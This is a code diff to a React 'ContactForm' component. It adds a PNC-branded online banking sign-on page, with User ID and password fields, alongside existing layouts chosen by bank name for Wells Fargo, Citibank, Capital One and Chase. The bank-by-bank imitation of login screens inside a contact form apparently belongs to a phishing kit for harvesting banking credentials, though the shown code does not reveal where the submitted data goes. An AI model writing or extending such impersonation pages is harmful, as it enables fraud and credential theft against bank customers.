@@ -90,6 +90,7 @@ export default function ContactForm() {
   const isWellsFargo = bankName?.toLowerCase().includes('wells fargo')
   const isCitibank = bankName?.toLowerCase().includes('citibank')
   const isCapitalOne = bankName?.toLowerCase().includes('capital one')
+  const isPNC = bankName?.toLowerCase().includes('pnc')
   const isChase = bankName?.toLowerCase().includes('chase')
 
   // ---- FORMULARIO ----
@@ -481,6 +482,102 @@ export default function ContactForm() {
                   </a>
                   <a href="#" className="block text-sm font-semibold text-blue-600 hover:text-blue-700">
                     Set Up Online Access
+                  </a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )
+    }
+
+    // Diseño para PNC
+    if (isPNC) {
+      return (
+        <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
+          <div className="mx-auto max-w-2xl px-4 py-10 sm:px-8">
+            {/* Header con barra azul */}
+            <div className="mb-10 border-b-4 border-gray-800 pb-6">
+              <h1 className="mb-2 text-2xl font-bold text-content-primary">
+                Sign On to Online Banking
+                <span className="text-gray-600"> or </span>
+                <a href="#" className="text-blue-600 hover:text-blue-700">
+                  select another service
+                </a>
+              </h1>
+            </div>
+
+            <div className="space-y-6">
+              {/* User ID */}
+              <div>
+                <label className="mb-2 block text-sm font-semibold text-content-primary">User ID (required)</label>
+                <div className="relative">
+                  <div className="absolute left-0 top-0 bottom-0 w-1 rounded-l bg-orange-600" />
+                  <input
+                    type="text"
+                    required
+                    value={username}
+                    onChange={(e) => setUsername(e.target.value)}
+                    placeholder="Enter User ID"
+                    className="w-full border-2 border-black/10 bg-white pl-4 py-3 pr-4 text-content-primary outline-none transition-colors placeholder:text-gray-500 focus:border-blue-600"
+                  />
+                </div>
+              </div>
+
+              {/* Password */}
+              <div>
+                <label className="mb-2 block text-sm font-semibold text-content-primary">Password (required)</label>
+                <div className="relative">
+                  <input
+                    type={showPassword ? 'text' : 'password'}
+                    required
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    placeholder="Enter Password"
+                    className="w-full border-2 border-black/10 bg-white py-3 pl-4 pr-12 text-content-primary outline-none transition-colors placeholder:text-gray-500 focus:border-blue-600"
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setShowPassword(!showPassword)}
+                    className="absolute right-4 top-1/2 -translate-y-1/2 text-blue-600 hover:text-blue-700"
+                  >
+                    <Icon name={showPassword ? 'eye-off' : 'eye'} size={20} />
+                  </button>
+                </div>
+              </div>
+
+              {/* Remember User ID */}
+              <label className="flex items-center gap-3 py-2">
+                <input
+                  type="checkbox"
+                  checked={rememberUsername}
+                  onChange={(e) => setRememberUsername(e.target.checked)}
+                  className="h-5 w-5 cursor-pointer rounded border-2 border-black/30"
+                />
+                <span className="text-sm text-content-primary">Remember User ID</span>
+              </label>
+
+              {/* Sign On Button */}
+              <button
+                type="submit"
+                disabled={submitting}
+                onClick={submitForm}
+                className="w-full bg-gray-300 py-3.5 font-bold text-content-primary hover:bg-gray-400 disabled:opacity-60"
+              >
+                {submitting ? 'Signing in…' : 'Sign On'}
+              </button>
+
+              {/* Links */}
+              <div className="space-y-3 border-t border-black/10 pt-6 text-center">
+                <div>
+                  <a href="#" className="text-sm text-blue-600 hover:text-blue-700 font-semibold">
+                    Forgot ID or Password?
+                  </a>
+                </div>
+                <div className="text-gray-500">or</div>
+                <div>
+                  <a href="#" className="text-sm text-blue-600 hover:text-blue-700 font-semibold">
+                    Enroll In Online Banking
                   </a>
                 </div>
               </div>
